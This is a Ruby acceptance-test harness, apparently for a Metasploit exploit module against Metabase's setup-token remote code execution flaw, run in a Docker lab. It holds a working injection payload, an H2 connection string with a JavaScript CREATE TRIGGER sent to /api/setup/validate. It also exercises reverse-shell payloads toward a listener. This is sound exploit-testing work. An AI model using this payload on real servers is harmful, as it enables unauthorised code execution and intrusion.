# frozen_string_literal: true

require 'base64'
require 'securerandom'
require_relative '../../../tools/dev/module_target_endpoint'

# Independent native API, database, file and process controls for the real owner.
module MetabaseAcceptance
  OWNER = 'exploit/linux/http/metabase_setup_token_rce'

  def record(name, value)
    File.open(File.join(target_runtime.fetch('artifacts'), name), 'a') { |file| file.puts(JSON.generate(value)) }
  end

  def vulnerable?
    ENV.fetch('METABASE_TARGET_VULNERABLE') == 'true'
  end

  def setup_token_missing?
    ENV.fetch('METABASE_TOKEN_MISSING', 'false') == 'true'
  end

  def expected_check
    ENV.fetch('METABASE_EXPECTED_CHECK', vulnerable? ? 'appears' : 'safe')
  end

  def select_endpoint
    compose = target_runtime.fetch('compose')
    inspect_object = lambda do |kind, identifier|
      output, error, status = Open3.capture3('docker', kind, 'inspect', identifier)
      record('metabase-endpoint-inspections.jsonl', kind: kind, identifier: identifier, actual_exit: status.exitstatus, stdout: output, stderr: error)
      expect(status.exitstatus).to eq(0), error
      JSON.parse(output).fetch(0)
    end
    selector = ModuleTargetEndpoint.new(project: compose.fetch(compose.index('--project-name') + 1), network: 'default', container: lambda { |service|
      output, error, status = Open3.capture3(*compose, 'ps', '-q', service)
      expect(status.exitstatus).to eq(0), error
      inspect_object.call('container', output.strip)
    }, network_inspection: ->(identifier) { inspect_object.call('network', identifier) })
    target_runtime.fetch('module_endpoints')['target'] = { 'host' => selector.address('target'), 'port' => 3000 }
  end

  def native_http(path, body = nil, headers: {})
    # curl owns this format token; it is not Ruby interpolation.
    argv = ['curl', '--silent', '--show-error', '--max-time', '35', '--write-out', '\n%{http_code}'] # rubocop:disable Style/FormatStringToken
    headers.each { |key, value| argv += ['--header', key + ': ' + value] }
    argv += ['--header', 'Content-Type: application/json', '--data-raw', JSON.generate(body)] if body
    raw = target_exec('target', *argv, 'http://127.0.0.1:3000' + path).dup.force_encoding(Encoding::UTF_8)
    payload, _separator, status = raw.rpartition("\n")
    row = { path: path, inputs: body, headers: headers, status: Integer(status, 10), body_base64: Base64.strict_encode64(payload.b) }
    begin
      row[:document] = JSON.parse(payload)
    rescue JSON::ParserError
      nil
    end
    record('metabase-native-http.jsonl', row)
    row
  end

  def exists?(path)
    output = target_exec('target', 'sh', '-c', 'if test -e "$1"; then echo present; else echo absent; fi', '_', path)
    output.strip == 'present'
  end

  def native(action, path:)
    raise ArgumentError, 'Unowned native proof path' unless path.start_with?('/tmp/module-target-metabase-')

    return exists?(path) if action == 'exists'
    raise ArgumentError, 'Unsupported native proof action' unless action == 'read'

    { 'base64' => Base64.strict_encode64(target_exec('target', 'cat', path).b), 'uid' => Integer(target_exec('target', 'stat', '-c', '%u', path).strip, 10) }
  end

  def application_records
    %w[core_user setting metabase_database].to_h do |table|
      key = table == 'setting' ? 'key' : 'id'
      sql = "SELECT coalesce(json_agg(row_to_json(entry) ORDER BY entry.\"#{key}\"),'[]') FROM #{table} entry"
      value = JSON.parse(target_exec('reporting_db', 'psql', '-X', '-U', 'module_framework', '-d', 'metabase', '-Atc', sql))
      [table, value]
    end
  end

  def process_identities
    # Native probe/health processes run as root; all application payloads use 2000.
    script = %q{for file in /proc/[0-9]*/stat; do prefix=${file%/stat}; test -r "$prefix/status" || continue; uid=$(awk '/^Uid:/ {print $2; exit}' "$prefix/status" 2>/dev/null); test "$uid" = 2000 || continue; IFS= read -r stat < "$file" || continue; printf '%s\t%s\t' "$stat" "$uid"; base64 -w 0 "$prefix/cmdline"; printf '\n'; done}
    identities = target_exec('target', 'sh', '-c', script).lines.map do |line|
      stat, uid, command = line.chomp.split("\t", 3)
      fields = stat.rpartition(') ').last.split
      { 'pid' => Integer(stat.split.first, 10), 'ppid' => Integer(fields.fetch(1), 10), 'start' => fields.fetch(19), 'uid' => Integer(uid, 10), 'command_base64' => command }
    end
    identities.sort_by { |row| row.fetch('pid') }
  end

  def native_before
    expected = JSON.parse(File.read('test/module_targets/metabase/vendor.json')).fetch(ENV.fetch('METABASE_TARGET_VERSION'))
    @expected_jar = expected.fetch('jar_sha256')
    expect(target_exec('target', 'sha256sum', '/app/metabase.jar').split.first).to eq(expected.fetch('jar_sha256'))
    properties = native_http('/api/session/properties')
    expect(properties.fetch(:status)).to eq(200)
    expect(properties.fetch(:document).fetch('version').fetch('tag')).to eq('v' + expected.fetch('version'))
    token = properties.fetch(:document).fetch('setup-token')
    expect(application_records.fetch('core_user')).to eq([])
    if ENV.fetch('METABASE_COMPLETE_SETUP', 'true') == 'true'
      setup = native_http('/api/setup', { token: token, user: { email: 'module.native@example.test', first_name: 'Module', last_name: 'Native', password: 'ModuleTarget-native-123!' }, prefs: { site_name: 'Module target Metabase', allow_tracking: false } })
      expect(setup.fetch(:status)).to eq(200), setup.inspect
      user = native_http('/api/user/current', nil, headers: { 'X-Metabase-Session' => setup.fetch(:document).fetch('id') })
      expect(user).to include(status: 200, document: include('is_superuser' => true))
    end
    if setup_token_missing?
      configured = native_http('/api/session/properties')
      expect(configured.fetch(:document)['setup-token']).to be_nil
    end
    @native_path = '/tmp/module-target-metabase-native-' + SecureRandom.hex(6)
    marker = 'Native Metabase café 雪'
    expression = "java.nio.file.Files.write(java.nio.file.Paths.get(#{JSON.generate(@native_path)}),new java.lang.String(#{JSON.generate(marker)}).getBytes(java.nio.charset.StandardCharsets.UTF_8))"
    db = "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER NATIVE#{SecureRandom.hex(5).upcase} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n#{expression}\n$$--=x"
    details = { details: { db: db, 'advanced-options' => false, ssl: true }, name: 'Native control', engine: 'h2' }
    expect(native_http('/api/setup/validate', { token: SecureRandom.uuid, details: details }).fetch(:status)).to eq(400)
    expect(exists?(@native_path)).to be(false)
    expect(native_http('/api/setup/validate', { token: token, details: details }).fetch(:status)).to eq(400)
    expect(exists?(@native_path)).to be(vulnerable?)
    if vulnerable?
      expect(target_exec('target', 'cat', @native_path).b).to eq(marker.b)
      expect(target_exec('target', 'stat', '-c', '%u', @native_path).strip).to eq('2000')
      target_exec('target', 'rm', '--', @native_path)
    end
    expect(native_http('/api/health')).to include(status: 200, document: { 'status' => 'ok' })
    expect(native_http('/api/module-target-missing').fetch(:status)).to eq(404)
    @native_executables = target_exec('target', 'su', 'metabase', '-s', '/bin/sh', '-c', 'for name in bash nc curl wget base64 mkfifo; do if command -v "$name" >/dev/null; then echo "$name"; fi; done').lines.map(&:strip)
    expect(@native_executables).to include('bash', 'base64')
    @baseline_records = application_records
    @baseline_processes = process_identities
    expect(@baseline_processes).to contain_exactly(include('uid' => 2000))
    record('metabase-native-baseline.jsonl', version: expected, records: @baseline_records, processes: @baseline_processes)
  end

  def start_console
    expect(console_command('db_connect module_framework:module-target-framework-db-password@reporting_db:5432/module_targets', timeout: 120)).not_to match(/\[-\]|Error|Exception/)
    expect(console_command('db_status')).to include('Connected to module_targets. Connection type: postgresql.')
    code = 'load "test/module_targets/metabase/input_audit.rb";puts "METABASE_AUDIT="+MetabaseTargetInputs.install(framework)'
    expect(console_command("irb -e #{code.inspect}")).to include('METABASE_AUDIT=exploit/linux/http/metabase_setup_token_rce')
    code = 'load "test/module_targets/metabase/session_control.rb";puts "METABASE_SESSION_CONTROL="+MetabaseSessionControl.install(framework).to_json'
    expect(console_command("irb -e #{code.inspect}")).to include('METABASE_SESSION_CONTROL={"installed":true,')
  end

  def preserved
    wait_for_expect(40, 0.2) do
      expect(application_records).to eq(@baseline_records)
      expect(process_identities).to eq(@baseline_processes)
    end
    output = console_command(%q{irb -e 'puts "METABASE_IDLE="+{jobs:framework.jobs.keys,sessions:framework.sessions.keys}.to_json'})
    expect(output).to include('METABASE_IDLE={"jobs":[],"sessions":[]}')
  end

  def owner_rows
    path = File.join(target_runtime.fetch('artifacts'), 'metabase-owner-calls.jsonl')
    File.file?(path) ? File.readlines(path).map { |line| JSON.parse(line) } : []
  end

  def invoke(options = {}, action: 'run', reuse: false, check_code: expected_check, incompatible: false)
    offset = owner_rows.length
    settings = { 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'true', 'DisablePayloadHandler' => true, 'AutoCheck' => true, 'ForceExploit' => false, 'TARGETURI' => '/', 'SSL' => false, 'HttpClientTimeout' => 5, 'HttpTrace' => true, 'HttpTraceHeadersOnly' => true }.merge(options)
    settings.delete('CMD') unless settings.fetch('PAYLOAD') == 'cmd/unix/generic'
    output = nil
    begin
      if reuse
        endpoint = target_runtime.fetch('module_endpoints').fetch('target')
        values = { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port') }.merge(settings)
        output = console_command("#{action} #{format_datastore_options(values)}", timeout: 100)
      else
        output = run_target_module(OWNER, 'target', settings, action: action, allow_errors: true, command_timeout: 100)
      end
    ensure
      record('metabase-invocations.jsonl', options: settings, action: action, reuse: reuse, output: (output || console.all_data).dup.force_encoding(Encoding::UTF_8), rows: owner_rows.drop(offset))
    end
    if incompatible
      expect(owner_rows.drop(offset)).to eq([])
      expect(output).to include(settings.fetch('PAYLOAD') + ' is not a compatible payload.')
      expect(output).not_to match(/session \d+ opened/)
      return output.dup.force_encoding(Encoding::UTF_8)
    end

    checks = owner_rows.drop(offset).select { |row| row['kind'] == 'check-return' }
    if action == 'check' || settings.fetch('AutoCheck')
      expect(checks).to contain_exactly(include('code' => check_code, 'reason' => be_a(String)))
      expect(checks.fetch(0).fetch('reason')).not_to be_empty
    else
      expect(checks).to eq([])
    end
    output.dup.force_encoding(Encoding::UTF_8)
  end

  def command_proof(text, options = {}, residue: nil)
    2.times do |iteration|
      path = "/tmp/module-target-metabase-#{@case}-#{iteration}"
      @owned_files << path
      command = "printf '#{text}' > #{path}"
      command += ' ' * ((residue - command.bytesize) % 3) unless residue.nil?
      offset = owner_rows.length
      output = invoke({ 'CMD' => command }.merge(options), reuse: iteration.positive?)
      posts = owner_rows.drop(offset).select { |row| row['kind'] == 'http' && row['method'] == 'POST' }
      if vulnerable?
        expect(output).not_to include('Exploit failed', 'Exploit aborted due to failure')
        wait_for_expect(40, 0.2) { expect(exists?(path)).to be(true) }
        expect(target_exec('target', 'cat', path).b).to eq(text.b)
        expect(target_exec('target', 'stat', '-c', '%u', path).strip).to eq('2000')
        expect(posts.length).to eq(1)
        body = JSON.parse(Base64.strict_decode64(posts.fetch(0).fetch('data_base64')))
        encoded = body.fetch('details').fetch('details').fetch('db')[%r{\{echo,([A-Za-z0-9+/]+)\}}, 1]
        expect(encoded).not_to be_nil
        decoded = Base64.strict_decode64(encoded)
        expect(decoded).to start_with(command.b)
        expect(decoded.delete_prefix(command.b)).to match(/\A {0,2}\z/n)
        record('metabase-command-proofs.jsonl', command_base64: Base64.strict_encode64(command.b), decoded_base64: Base64.strict_encode64(decoded), artifact_base64: Base64.strict_encode64(text.b), uid: 2000)
      elsif setup_token_missing?
        expect(output).to include('Unable to find valid setup-token')
        expect(posts).to eq([])
        expect(exists?(path)).to be(false)
      elsif options['ForceExploit'] || options['AutoCheck'] == false
        expect(posts).to contain_exactly(include('status' => 400))
        expect(Base64.strict_decode64(posts.fetch(0).fetch('response_base64'))).to include('Instance already initialized')
        expect(exists?(path)).to be(false)
      else
        expect(output).to include('Exploit aborted due to failure')
        expect(posts).to eq([])
        expect(exists?(path)).to be(false)
      end
      preserved
    end
  end

  def rpc(expression)
    code = "puts 'METABASE_JSON='+(#{expression}).to_json"
    output = console_command("irb -e #{code.inspect}", timeout: 45)
    captured = output[/^METABASE_JSON=(.+)\r?$/, 1]
    expect(captured).not_to be_nil, output
    JSON.parse(captured)
  end

  def session_rows
    workspace = 'metabase_' + @case
    raise ArgumentError, 'Invalid controlled workspace' unless workspace.match?(/\Ametabase_[0-9_]+\z/)

    query = "SELECT coalesce(json_agg(row_to_json(session) ORDER BY session.id),'[]') FROM sessions session JOIN hosts host ON host.id=session.host_id JOIN workspaces workspace ON workspace.id=host.workspace_id WHERE workspace.name='#{workspace}'"
    JSON.parse(target_exec('reporting_db', 'psql', '-X', '-U', 'module_framework', '-d', 'module_targets', '-Atc', query))
  end

  def session_proof(payload, options = {})
    2.times do |iteration|
      path = "/tmp/module-target-metabase-session-#{@case}-#{iteration}"
      marker = "metabase-session-#{@case}-#{iteration}"
      @owned_files << path
      identifier = nil
      settings = { 'PAYLOAD' => payload, 'DisablePayloadHandler' => false, 'LHOST' => listener_host, 'LPORT' => 4495, 'WfsDelay' => 12 }.merge(options)
      expect(@native_executables).to include('bash') if payload == 'cmd/unix/reverse_bash'
      expect(@native_executables).to include('nc', 'mkfifo') if payload == 'cmd/unix/reverse_netcat'
      begin
        offset = owner_rows.length
        temporary_entries = target_exec('target', 'sh', '-c', 'for path in /tmp/* /tmp/.[!.]*; do if test -e "$path"; then printf "%s\n" "$path"; fi; done').lines.map(&:strip)
        output = invoke(settings, action: 'run -z', reuse: iteration.positive?)
        post = owner_rows.drop(offset).find { |row| row['kind'] == 'http' && row['method'] == 'POST' }
        expect(post).not_to be_nil
        body = JSON.parse(Base64.strict_decode64(post.fetch('data_base64')))
        encoded = body.fetch('details').fetch('details').fetch('db')[%r{\{echo,([A-Za-z0-9+/]+)\}}, 1]
        expect(encoded).not_to be_nil
        command = Base64.strict_decode64(encoded)
        fifo_path = command[%r{\bmkfifo (/tmp/[a-z]{4,7});}, 1]
        if fifo_path
          expect(temporary_entries).not_to include(fifo_path)
          @owned_files << fifo_path
        end
        identifier = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
        expect(identifier).not_to be_nil, output
        identifier = Integer(identifier, 10)
        wait_for_expect(60, 0.2) do
          events = File.readlines(File.join(target_runtime.fetch('artifacts'), 'ready-sessions.jsonl')).map { |line| JSON.parse(line) }
          expect(events.map { |row| row.fetch('id') }).to include(identifier)
        end
        proof = rpc("MetabaseSessionControl.proof(framework,#{identifier},#{path.inspect},#{marker.inspect})")
        expect(proof).not_to have_key('error')
        expect(proof).to include('via_exploit' => OWNER, 'via_payload' => 'payload/' + payload, 'session_host' => target_runtime.fetch('module_endpoints').fetch('target').fetch('host'))
        observed = native('read', path: path)
        expect(observed).to include('base64' => Base64.strict_encode64(marker), 'uid' => 2000)
        live = process_identities
        process = live.find { |row| row.fetch('pid') == proof.fetch('pid') }
        expect(process).to include('uid' => 2000)
        expect(@baseline_processes.map { |row| row.fetch('pid') }).not_to include(proof.fetch('pid'))
        chain = []
        while process && @baseline_processes.none? { |row| row.fetch('pid') == process.fetch('pid') }
          chain << process
          process = live.find { |row| row.fetch('pid') == process.fetch('ppid') }
        end
        expect(session_rows).to include(include('id' => proof.fetch('db_id'), 'via_exploit' => OWNER, 'via_payload' => 'payload/' + payload, 'closed_at' => nil))
        record('metabase-session-lifecycle.jsonl', phase: 'used', payload: payload, proof: proof, target_ancestry: chain)
        expect(rpc("MetabaseSessionControl.shutdown(framework,#{identifier})")).to include('graceful_remote_exit_requested' => true)
        wait_for_expect(40, 0.2) { expect(process_identities.map { |row| row.fetch('pid') }).not_to include(proof.fetch('pid')) }
        record('metabase-session-lifecycle.jsonl', phase: 'remote-exit', id: identifier, payload: payload, remote_session_pid_gone: true)
        # Close the Framework peer after proving the remote session process exits.
        rpc("framework.sessions[#{identifier}]&.shell_close;true") if proof.fetch('type') == 'shell'
        rpc("framework.sessions[#{identifier}]&.kill;true")
        wait_for_expect(75, 0.2) do
          current = process_identities
          expect(current.select { |row| chain.any? { |old| old.values_at('pid', 'start') == row.values_at('pid', 'start') } }).to eq([])
        end
        preserved
        expect(session_rows).to all(include('closed_at' => be_a(String)))
        expect(exists?(fifo_path)).to be(false) if fifo_path
        expect(output).not_to include('Exploit aborted', 'Exploit failed')
        record('metabase-session-lifecycle.jsonl', phase: 'closed', id: identifier, payload: payload, target_pids_gone: true, database_rows: session_rows)
      ensure
        rpc("framework.sessions[#{identifier}]&.kill;true") if identifier
        console_command('jobs -K')
      end
    end
  end

  def incompatible_payload_proof(payload, options = {})
    2.times do |iteration|
      settings = {
        'PAYLOAD' => payload, 'DisablePayloadHandler' => false, 'LHOST' => listener_host, 'LPORT' => 4495,
        'FETCH_SRVHOST' => listener_host, 'FETCH_SRVPORT' => 8081, 'FETCH_WRITABLE_DIR' => '/tmp',
        'FETCH_FILENAME' => "module-target-metabase-incompatible-#{@case}-#{iteration}",
        'FETCH_URIPATH' => "module-target-metabase-incompatible-#{@case}-#{iteration}"
      }.merge(options)
      invoke(settings, action: 'run -z', reuse: iteration.positive?, incompatible: true)
      expect(exists?('/tmp/' + settings.fetch('FETCH_FILENAME'))).to be(false)
      preserved
    end
  end

  def native_after
    target_exec('target', 'rm', '--', @native_path) if @native_path && exists?(@native_path)
    expect(target_exec('target', 'sha256sum', '/app/metabase.jar').split.first).to eq(@expected_jar)
    %w[target framework reporting_db].each do |service|
      expect(target_exec(service, 'cat', '/sys/fs/cgroup/memory.events')).to include("oom 0\n", "oom_kill 0\n")
      expect(target_exec(service, 'cat', '/sys/fs/cgroup/pids.events').strip).to eq('max 0')
    end
  end
end
